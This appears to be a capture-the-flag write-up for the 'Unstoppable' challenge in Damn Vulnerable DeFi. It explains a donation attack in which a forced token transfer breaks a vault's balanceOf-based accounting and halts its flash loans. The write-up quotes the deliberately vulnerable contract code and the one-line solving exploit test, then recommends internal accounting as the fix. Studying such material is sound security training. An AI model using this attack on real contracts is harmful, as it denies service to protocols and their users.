# Unstoppable

**As Always please try the challenge yourself first! Use your creativity, AI tools, YouTube tutorials on the topic, whatever it takes to try and solve it!**

**Challenge Description:**

```
There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flash loan feature.

Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.
```

*DVT - Damn Vulnerable Token*

This challenge is about learning how vaults work, and how using the `balanceOf` as a method for accounting. This is an opening for a donation attack. 

**Donation Attack**
A donation attack is a type of DoS (Denial of Service) attack, where the contract is using the keyword `balanceOf` as a method for accounting. Because of the nature of smart contract, in which they cannot deny forced transfers, using the `balanceOf` keyword will be off if the attacker would force transfer funds into the account, rendering the protocol, or at least part of it, unusable. Therefore, DoS.

In this challenge there is a function called `totalAssets`, which simply returns the balance of the contract in a specific asset:

<details><summary>totalAssets()</summary>

```javascript
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}
```

</details>

The function is used in the flash loan function to handle accounting:

<details><summary></summary>

```javascript
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
@>      uint256 balanceBefore = totalAssets();    <@
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }
```

</details>

In this example a simple donation attack will render the whole flash loan functionality unusable. Here is an example of how an attacker can exploit this vulnerability:

1. Single forced transfer to the contract 
2. Checks to see the it worked

<details><summary>Test Code</summary>

```javascript

    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
    }

        function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
```

</details>

## Recommendations

Instead of using the `balanceOf` for accounting consider using internal accounting. For example, a solution could be a mapping for a token to the amount:

```diff
+ mapping(address asset => uint256 amount) totalBalances;

+ function totalAssets(address asset) public view override nonReadReentrant returns (uint256) {
+   return totalBalances[asset];
+ }
```